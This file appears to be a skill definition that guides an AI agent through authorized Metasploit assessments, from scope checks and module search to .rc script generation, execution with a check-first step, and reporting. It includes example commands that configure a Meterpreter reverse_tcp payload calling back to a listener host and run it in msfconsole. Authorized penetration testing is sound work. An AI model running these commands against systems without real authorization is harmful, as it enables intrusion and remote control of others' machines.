---
name: openclaw-metasploit
description: Plan and execute authorized Metasploit assessments for OpenClaw tasks with repeatable workflows, including target triage, exploit module selection, option tuning, .rc generation, controlled execution, and evidence-focused reporting. Use when requests involve msfconsole operations, module/payload matching, exploit/check automation, session verification, or pentest result writeups.
---

# OpenClaw Metasploit

## Overview

Use this skill to run deterministic and auditable Metasploit workflows for authorized security testing.
Prefer a check-first workflow and generate repeatable `.rc` scripts via `scripts/build_rc.py` instead of ad hoc console typing.

## Workflow Decision Tree

1. Confirm authorization and scope before any technical step.
2. Collect target facts: service, version, network position, and constraints.
3. Select candidate modules and payloads using [module-selection.md](references/module-selection.md).
4. Generate and review a resource script with `scripts/build_rc.py`.
5. Execute in `msfconsole` with `check` before `run` or `exploit`.
6. Validate outcome with session and artifact evidence.
7. Produce a concise report with reproducible commands and findings.

## Step 1: Confirm Scope and Safety

Require explicit confirmation of:
- Target ownership or testing authorization
- In-scope hosts, ports, and time window
- Forbidden techniques (DoS, persistence, data exfiltration)

If scope is unclear, stop and ask for clarification before proceeding.

## Step 2: Build Target Context

Capture minimum actionable context:
- Host and network placement
- Service and version fingerprint
- Authentication state
- Environmental constraints (egress filtering, AV/EDR, uptime sensitivity)

Use this context to justify each module choice.

## Step 3: Select Modules and Payloads

Use `search` and `info` in `msfconsole` to narrow candidates:

```bash
search type:exploit cve:2023 service:http
info exploit/linux/http/<module_name>
show options
show payloads
```

Choose modules by:
- Reliability and target compatibility
- Required options completeness
- Post-exploit objective fit (shell type, architecture, privilege level)

For common mappings and tradeoffs, read [module-selection.md](references/module-selection.md).

## Step 4: Generate Resource Script

Generate reproducible execution scripts:

```bash
python3 scripts/build_rc.py \
  --module exploit/linux/http/example_module \
  --rhosts 10.10.10.15 \
  --rport 8080 \
  --payload linux/x64/meterpreter/reverse_tcp \
  --lhost 10.10.10.5 \
  --lport 4444 \
  --set TARGETURI=/app \
  --check \
  --job \
  --output run_example.rc
```

Review generated commands before execution:
- Confirm no out-of-scope hosts
- Confirm payload and listener values
- Confirm optional settings are intentional

## Step 5: Execute in msfconsole

Run with logging enabled:

```bash
msfconsole -q -r run_example.rc
```

Inside `msfconsole`, verify:
- `check` output status
- `run` or `exploit` result
- `sessions -l` visibility

If exploitation fails, adjust one variable at a time and re-run.

## Step 6: Validate and Capture Evidence

Minimum evidence set:
- Module path and key options
- Command/script used for execution
- Check result and exploit result
- Session details (type, user, host)
- Relevant non-sensitive proof artifacts

Use [workflow.md](references/workflow.md) for command-level checklists and reporting structure.

## Step 7: Report

Produce output with:
- Objective and scope
- Reproducible steps
- Outcome and confidence
- Impact summary
- Recommended remediation and verification method

Keep reports concise and technically verifiable.

## Resources

### scripts/build_rc.py
Generate a repeatable Metasploit `.rc` resource script from structured options.

### references/module-selection.md
Module and payload selection heuristics with common service mappings.

### references/workflow.md
Command checklist for execution, troubleshooting loop, and report field requirements.
